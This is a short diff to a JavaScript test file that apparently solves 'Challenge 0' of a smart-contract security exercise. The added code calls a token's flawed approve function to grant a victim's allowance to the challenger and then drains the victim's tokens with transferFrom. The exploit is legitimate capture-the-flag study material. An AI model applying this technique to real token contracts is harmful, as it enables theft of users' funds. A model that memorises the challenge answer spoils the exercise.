@@ -54,6 +54,19 @@ describe("Solve Challenge 0", function () {
 
         //======= COMPLETE THIS SECTION AS YOU REQUIRE =======
 
+        /* No need for an exploit contract to solve this challenge */
+
+        await vtoken["approve(address,address,uint256)"](
+            vitalik,
+            challengerAddress,
+            ethers.utils.parseEther(vtokenPreHack)
+        );
+        await vtoken.transferFrom(
+            vitalik,
+            challengerAddress,
+            ethers.utils.parseEther(vtokenPreHack)
+        );
+
         //====================================================
 
         ///////////////////////////////////////////////////
